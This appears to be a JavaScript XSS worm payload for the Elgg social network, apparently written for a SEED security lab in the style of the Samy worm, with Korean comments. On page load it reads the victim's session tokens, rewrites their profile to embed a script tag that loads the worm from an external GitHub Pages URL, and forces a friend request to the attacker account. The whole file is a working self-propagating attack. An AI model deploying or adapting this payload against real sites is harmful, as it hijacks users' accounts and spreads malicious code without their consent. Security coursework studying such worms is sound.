window.onload = function () {
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var desc = "This profile has been hacked! <script src='https://username.github.io/xss-worm/xss_worm.js'></script>";
    var content = userName + guid + ts + token + "&description=" + encodeURIComponent(desc);
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    var samygid = 59;

    if (elgg.session.user.guid != samygid) {
        // 프로필 수정 요청
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);

        // Samy를 친구로 추가하는 요청
        var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + samygid + ts + token;
        var AjaxFriend = new XMLHttpRequest();
        AjaxFriend.open("GET", addFriendUrl, true);
        AjaxFriend.send();
    }
}
